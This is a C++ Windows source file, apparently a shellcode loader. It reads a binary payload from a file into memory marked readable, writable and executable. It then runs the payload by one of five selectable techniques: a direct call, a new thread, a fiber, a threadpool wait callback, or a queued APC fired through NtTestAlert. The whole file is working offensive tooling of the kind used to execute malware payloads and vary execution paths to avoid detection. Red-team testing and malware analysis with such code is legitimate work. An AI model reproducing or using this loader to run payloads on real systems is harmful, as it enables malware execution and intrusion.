#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <windows.h>
#include <string>

using namespace std;

void ExecuteByThread(LPVOID ShellCode)
{
	HANDLE ThreadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ShellCode, NULL, 0, 0);

	WaitForSingleObject(ThreadHandle, INFINITE);
}

void ExecuteByFiber(LPVOID ShellCode)
{
	PVOID MainFiber = ConvertThreadToFiber(NULL);

	PVOID FiberHandle = CreateFiber(NULL, (LPFIBER_START_ROUTINE)ShellCode, NULL);

	SwitchToFiber(FiberHandle);
}

void ExecuteByThreadPool(LPVOID ShellCode)
{
	HANDLE Event = CreateEvent(NULL, FALSE, TRUE, NULL);

	PTP_WAIT ThreadPool = CreateThreadpoolWait((PTP_WAIT_CALLBACK)ShellCode, NULL, NULL);

	SetThreadpoolWait(ThreadPool, Event, NULL);

	WaitForSingleObject(Event, INFINITE);
}

void ExecuteByQueueAPC(LPVOID ShellCode)
{
	using NTAlert = NTSTATUS(NTAPI*)();

	NTAlert TestAlert = (NTAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));

	PTHREAD_START_ROUTINE APCRoutine = (PTHREAD_START_ROUTINE)ShellCode;

	QueueUserAPC((PAPCFUNC)APCRoutine, GetCurrentThread(), NULL);

	TestAlert();
}

void ExecuteByDefault(LPVOID ShellCode)
{
	((VOID(*)())ShellCode)();
}

int main(int argc, char **argv)
{
	FILE* BinaryFile = fopen(argv[2], "rb");

	fseek(BinaryFile, 0, SEEK_END);

	int ShellScope = ftell(BinaryFile);

	LPVOID ShellCode = VirtualAlloc(0, ShellScope, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	fseek(BinaryFile, 0, SEEK_SET);

	fread(ShellCode, ShellScope, 1, BinaryFile);

	cout << "Shellcode Allocated Address: " << hex << ShellCode << endl;

	switch (atoi(argv[1]))
	{
	case 1:
		ExecuteByDefault(ShellCode);
		break;
	case 2:
		ExecuteByThread(ShellCode);
		break;
	case 3:
		ExecuteByFiber(ShellCode);
		break;
	case 4:
		ExecuteByThreadPool(ShellCode);
		break;
	case 5:
		ExecuteByQueueAPC(ShellCode);
		break;
	}

	VirtualFree(ShellCode, sizeof(ShellCode), MEM_RELEASE);

	return 0;
}